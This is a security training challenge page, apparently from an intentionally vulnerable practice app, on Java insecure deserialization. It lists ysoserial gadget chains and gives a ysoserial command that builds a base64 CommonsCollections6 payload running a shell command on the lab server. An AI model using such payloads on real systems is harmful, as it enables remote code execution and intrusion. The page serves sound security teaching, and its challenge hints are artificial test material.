

<hr>
<h5>About the vulnerabilities</h5>
<p>
  Deserialization was a lot in the news lately with the Equifax breach being conducted via a deserialization attack in Apache Struts. 
  The combination of using unpatched 3rd party components that have deserialization vulnerabilities can be fatal. 
 
<br><br> 
The Open Source project <a href="https://github.com/frohoff/ysoserial">ysoserial</a> provides an open source tool to test and exploit Insecure Deserialization flaws in Java apps.
Below is an excerpt from the vulnerable 3rd party libraries that ysoserial supports.
<br> <br> 
The scariest part is that these 3rd party components don't even need to be directly used. 
They only need to be on the class path of the vulnerable application and the class loader will attempt to deserialize them if a vulnerable type is sent.
<pre class="pre-scrollable">
$  java -jar ysoserial.jar
Y SO SERIAL?
Usage: java -jar ysoserial.jar [payload] '[command]'
    Available payload types:
        Payload             Authors                     Dependencies
        -------             -------                     ------------
        BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
        C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
        Clojure             @JackOfMostTrades           clojure:1.8.0
        CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
        CommonsCollections1 @frohoff                    commons-collections:3.1
        CommonsCollections2 @frohoff                    commons-collections4:4.0
        CommonsCollections3 @frohoff                    commons-collections:3.1
        CommonsCollections4 @frohoff                    commons-collections4:4.0
        CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
        CommonsCollections6 @matthias_kaiser            commons-collections:3.1
        FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
        Groovy1             @frohoff                    groovy:2.3.9
        Hibernate1          @mbechler
        Hibernate2          @mbechler
        JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
        JRMPClient          @mbechler
        JRMPListener        @mbechler
        JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
        JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
        Jdk7u21             @frohoff
        Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
        MozillaRhino1       @matthias_kaiser            js:1.7R2
        Myfaces1            @mbechler
        Myfaces2            @mbechler
        ROME                @mbechler                   rome:1.0
        Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
        Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
        URLDNS              @gebl
        Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
</pre>

Here are the OWASP Top 10 links for Using Components with Known Vulnerabilities and Insecure Deserialization

</p>


<blockquote>
<p>
    <i>Prevalence of this issue is very widespread. Component-heavy development patterns 
        can lead to development teams not even understanding which components they use in their application or API, much less keeping them up to date.</i>
</p>
<footer>From OWASP <a target="_blank" rel="noopener noreferrer" href="https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities">A9-Using Components with Known Vulnerabilities</a></footer>
</blockquote>

<blockquote>
<p>
    <i>The impact of deserialization flaws cannot be overstated. These flaws can lead to remote code execution attacks, one of the most serious attacks possible.</i>
</p>
<footer>From OWASP <a target="_blank" rel="noopener noreferrer" href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization">A8-Insecure Deserialization</a></footer>
</blockquote>


<h5>Challenge Tips and Tricks</h5>
<p>
The website allows an administration page to process Java objects. 
The password to the administration site is one of the most commonly used (see brute force challenge)
<br><br>
Once you are logged in you will notice that the application accepts serialized command objects. You can use ysoserial to generate a
base64 encoded gadget.
<br><br>
The challenge is to create a file in the 'tmp' folder of the server. You can use a ysoserial from Linux or Windows bash like this:
<pre class="pre-scrollable">
java -jar ysoserial-master.jar CommonsCollections6 'touch /tmp/YOUR_FILE_NAME'|base64
</pre>
